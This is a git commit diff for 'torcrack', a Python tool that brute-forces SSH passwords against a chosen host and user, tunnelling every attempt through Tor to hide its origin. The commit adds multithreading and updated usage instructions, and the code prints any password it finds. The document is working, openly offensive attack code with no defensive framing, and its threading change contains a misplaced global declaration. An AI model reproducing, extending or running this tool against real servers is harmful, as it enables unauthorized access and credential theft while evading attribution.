ab248d8457d99613c87011b3b0ce1014e8e34d4e
norksec <norksec@protonmail.com>
2016-12-30 17:38:47 +0000

    added threading

--- README.md
+++ README.md
@@ -1,12 +1,10 @@
 # torcrack
 
-A simple Tor enabled SSH Brute Force attack in Python3.
+A simple Tor enabled, threaded SSH Brute Force dictionary attack in Python3.
 
 # requirements
 
 PyFiglet
-
-tqdm
 
 PySocks
 
@@ -18,7 +16,7 @@ tor
 
 git clone https://github.com/norksec/torcrack.git
 
-pip3 install pyfiglet tqdm pysocks paramiko
+pip3 install pyfiglet pysocks paramiko
 
 apt-get install -y tor
 
@@ -28,7 +26,7 @@ Make sure the tor service is running:
 
 service tor restart
 
-python3 torcrack.py -t target -p target_port -u username -d dictionary/password_list [-P tor_port (optional)]
+python3 torcrack.py -t target -p target_port -u username -d dictionary/password_list -P tor_port (optional) -m max_threads (optional)
 
 # last note
 
--- torcrack.py
+++ torcrack.py
@@ -3,11 +3,6 @@
 #norksec torcrack - (c) 2016 no rights reserved
 
 try:
-	from tqdm import *
-except:
-	print(' [-] Error: requires tqdm (pip3 install tqdm)')
-	os._exit(1)
-try:
 	from pyfiglet import Figlet
 except:
 	print(' [-] Error: requires PyFiglet (pip3 install pyfiglet)')
@@ -28,6 +23,11 @@ try:
 except:
 	print(' [-] Error: requires socks/SocksiPy/PySocks (pip3 install PySocks)')
 	os._exit(1)
+from threading import Thread
+from queue import Queue
+from time import sleep
+
+running = 0
 
 def cls():
 	os.system('cls' if os.name=='nt' else 'clear')
@@ -41,19 +41,25 @@ def exit_handler():
 	print('\n [~] Exiting...\n')
 
 def ssh_connect(password, code = 0):
+	global running
 	paramiko.util.log_to_file("paramiko.log")
 	ssh = paramiko.SSHClient()
 	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-
+	print(' [*] Testing password: ' + password)
 	try:
 		ssh.connect(tgtHost, port=tgtPort, username=tgtUser, password=password)
 	except paramiko.AuthenticationException:
-		code = 1
+		running -= 1
+		print(' [-] Password ' + password + ' incorrect.')
+		return running
 	except socket.error as e:
-		code = 2
-
+		print(' [-] Socket error. ')
+		os._exit(1)
+	running -= 1
 	ssh.close()
-	return code
+	print(' [+] Password for ' + tgtUser + ' found: ' + password)
+	exit_handler()
+	os._exit(1)
 
 def is_valid_ipv4(address):
 	try:
@@ -70,14 +76,15 @@ def is_valid_ipv4(address):
 
 def main():
 	atexit.register(exit_handler)
-	parser = optparse.OptionParser('%prog -t <target> -p <target port> -u <username> -d <dictionary/pass list> [-P tor port (default: 9050)]')
+	parser = optparse.OptionParser('%prog -t <target> -p <target port> -u <username> -d <dictionary/pass list> -P tor port (optional, default: 9050) -m max threads (optional, default: 4)')
+	parser.add_option('-m', dest='maxThreads', type='int', help='specify maximum number of threads (optional: default 4)')
 	parser.add_option('-P', dest='torPort', type='int', help='specify Tor port (optional: default 9050)')
 	parser.add_option('-t', dest='tgtHost', type='string', help='specify target (required)')
 	parser.add_option('-u', dest='tgtUser', type='string', help='specify username (required')
 	parser.add_option('-d', dest='dictFile', type='string', help='specify dictionary file/password list (required)')
 	parser.add_option('-p', dest='tgtPort', type='int', help="specify target port (required)")
 	(options, args) = parser.parse_args()
-	global tgtHost, tgtUser, dictFile, tgtPort, torPort
+	global tgtHost, tgtUser, dictFile, tgtPort, torPort, maxThreads
 	if (options.tgtHost == None) | (options.tgtUser == None) | (options.dictFile == None) | (options.tgtPort == None):
 		print('TorCrack.py - a simple Tor enabled SSH brute force attack.\n\n')
 		print(parser.error('Invalid Arguments.'))
@@ -92,21 +99,26 @@ def main():
 			try:
 				tgtHost = gethostbyname(options.tgtHost)
 			except:
-				print(" [-] Cannot resolve '%s': Unknown host" % options.tgtHost)
+				print(" [-] Cannot resolve '%s': Unknown host\n" % options.tgtHost)
 				exit(0)
 	if (options.torPort == None):
 		torPort = 9050
 	else:
 		torPort = options.torPort
-	print('\n [+] ' + options.tgtHost + ' resolved to ' + str(tgtHost))
+	if (options.maxThreads == None):
+		maxThreads = 4
+	else:
+		maxThreads = options.maxThreads
+	print('\n [+] Max Threads set to ' + str(maxThreads))
+	print(' [+] ' + options.tgtHost + ' resolved to ' + str(tgtHost))
 	print(' [+] Target locked: ' + str(tgtHost) + ':' + str(tgtPort))
 	print(' [+] Tor Port set to: ' + str(torPort))
 	print(' [+] Target username set to: ' + tgtUser)
-	
+
 	if not os.path.isfile(dictFile):
-		print(" [-] Dictionary file does not exist.")
-		os._exit(1)
-	
+		print(" [-] Dictionary file does not exist.\n")
+		exit(0)
+
 	print(' [+] Dictionary File/Password List set to: ' + dictFile)
 	lineMax = sum(1 for line in open(dictFile))
 	global session
@@ -122,30 +134,21 @@ def main():
 	print(' [+] Tor IP: ' + test)
 	paramiko.client.socket.socket = socks.socksocket
 	input_file = open(dictFile)
-	
-	for i in tqdm(input_file.readlines(), total=lineMax):
-		password = i.strip('\n')
-		try:
-			response = ssh_connect(password)
-			
-			if response == 0:
-				#print('Code: ' + str(response))
-				print(' [*] User: ' + str(tgtUser) + ' [*] Pass Found: ' + str(password))
-				os._exit(1)
-			elif response == 1:
-				#print('Code: ' + str(response))
-				pass
-			elif response == 2:
-				#print('Code: ' + str(response))
-				print(' [-] Connection Could Not Be Established To Address: ' + str(tgtHost) + ':' + str(tgtPort))
-				os._exit(1)
-		except Exception as e:
-			#print('Code: error')
-			print(' [-] Error: ' + e)
-			os._exit(1)
-	
+	running = 0
+	q = Queue(maxsize=0)
+	for j in input_file.readlines():
+		password = j.strip('\n')
+		q.put(password)
+	while (q.qsize() > 0):
+		if running < maxThreads:
+			global running
+			running += 1
+			passW = q.get()
+			worker = Thread(target=ssh_connect, args=(passW,))
+			worker.start()
+			sleep(1.5)
 	print(' [+] Password not found; Shutting down.')
-	
+
 if __name__ == '__main__':
 	cls()
 	intro()
